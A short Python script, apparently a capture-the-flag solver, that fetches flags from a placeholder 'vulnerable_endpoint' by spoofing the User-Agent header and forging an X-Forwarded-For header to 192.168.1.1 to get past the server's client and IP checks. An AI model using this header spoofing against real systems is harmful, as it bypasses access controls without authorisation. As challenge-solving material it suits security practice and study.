import requests
import base64
import re


x= str(input("Which flag do you need? \n 1 = FLAG-1 \n 2 = FLAG-2 \n 3 = FLAG-3 \n:"))

if x in {'1','2'}:     
    user_agent= 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'
else:
    user_agent= 'SAMSUNG-SGH-I617/1.0 Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.12) UP.Link/6.3.0.0.0'

    
url = "http://XYZ.com/vulnerable_endpoint"
headers = {"User-Agent": user_agent,
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"Host": "XYZ.com",
"Upgrade-Insecure-Requests": "1",
"Cache-Control": "max-age=0",
"Connection": "close"}
#proxy = {"http" : "http://127.0.0.1:8080"}

if x in {'2','3'}:
    headers["X-Forwarded-For"]="192.168.1.1"


req = requests.get(url, headers=headers)
if req.status_code == 200:
    print('Here we are!')
    pattern = re.compile('<code>(.*?)</code>')
    flag = pattern.findall(str(req.content))
    print('flag >>>> ',flag[0])
    
else:
    print('something went wrong')
    
